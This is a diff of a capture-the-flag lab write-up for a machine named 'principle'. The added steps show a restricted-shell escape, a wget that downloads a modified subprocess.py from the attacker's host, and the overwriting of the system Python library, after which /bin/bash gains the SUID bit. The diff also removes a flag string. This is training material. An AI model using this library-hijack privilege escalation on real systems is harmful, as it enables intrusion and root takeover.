@@ -579,42 +579,6 @@ total 868K
 Trying again:
 
 ```bash
-
-```
-
-```bash
-elohim@principle:~$ /bin/cat flag.txt
-/bin/cat flag.txt
-                           _
-                          _)\.-.
-         .-.__,___,_.-=-. )\`  a`\_
-     .-.__\__,__,__.-=-. `/  \     `\
-     {~,-~-,-~.-~,-,;;;;\ |   '--;`)/
-      \-,~_-~_-,~-,(_(_(;\/   ,;/
-       ",-.~_,-~,-~,)_)_)'.  ;;(
-         `~-,_-~,-~(_(_(_(_\  `;\
-   ,          `"~~--,)_)_)_)\_   \
-   |\              (_(_/_(_,   \  ;
-   \ '-.       _.--'  /_/_/_)   | |
-    '--.\    .'          /_/    | |
-        ))  /       \      |   /.'
-       //  /,        | __.'|  ||
-      //   ||        /`    (  ||
-     ||    ||      .'       \ \\
-     ||    ||    .'_         \ \\
-      \\   //   / _ `\        \ \\__
-       \'-'/(   _  `\,;        \ '--:,
-        `"`  `"` `-,,;         `"`",,;
-
-
-CONGRATULATIONS, you have defeated me!
-
-The flag is:
-K|tW4bw7$zNh'PwSh/jN
-
-```
-
-```bash
 talos@principle:~$ ./ssh -i .ssh/id_rsa elohim@127.0.0.1 -p 3445
 ./ssh -i .ssh/id_rsa elohim@127.0.0.1 -p 3445
 The authenticity of host '[127.0.0.1]:3445 ([127.0.0.1]:3445)' can't be established.
@@ -647,6 +611,16 @@ total 40K
 4.0K drwx------ 2 elohim elohim 4.0K Jul  6  2023 .ssh
 ```
 
+In some kind of restricted shell:
+
+```bash
+elohim@principle:~$ cd /tmp
+cd /tmp
+bash: cd: restricted
+elohim@principle:~$ /bin/cd /tmp
+/bin/cd /tmp
+bash: /bin/cd: restricted: cannot specify `/' in command names
+```
 
 Reading the flag:
 
@@ -754,14 +728,42 @@ My group can edit this file. I copied it to my host and made the following edit:
 
 ![[Pasted image 20240802195146.png]]
 
+Copying back to target:
+
+```bash
+elohim@principle:~$ wget http://192.168.0.51/subprocess.py
+wget http://192.168.0.51/subprocess.py
+--2024-08-02 14:44:21--  http://192.168.0.51/subprocess.py
+Connecting to 192.168.0.51:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 85786 (84K) [text/x-python]
+Saving to: ‘subprocess.py’
+
+subprocess.py       100%[===================>]  83.78K  --.-KB/s    in 0s      
+
+2024-08-02 14:44:21 (515 MB/s) - ‘subprocess.py’ saved [85786/85786]
+
+```
+
+Overwriting 
+
+```bash
+bash-5.2$ /bin/cp subprocess.py '/usr/lib/python3.11/subprocess.py'
+/bin/cp subprocess.py '/usr/lib/python3.11/subprocess.py
+```
+
+Waiting for message:
 
 ```bash
 Broadcast message from root@principle (somewhere) (Fri Aug  2 14:50:01 2024):  
                                                                                
 I have detected an intruder, stealing accounts: elohim
                                                                                
+```
 
+SUID bit set:
 
+```bash
 elohim@principle:~$ ls -lash /bin/bash
 ls -lash /bin/bash
 1.3M -rwsr-xr-x 1 root root 1.3M Apr 23  2023 /bin/bash
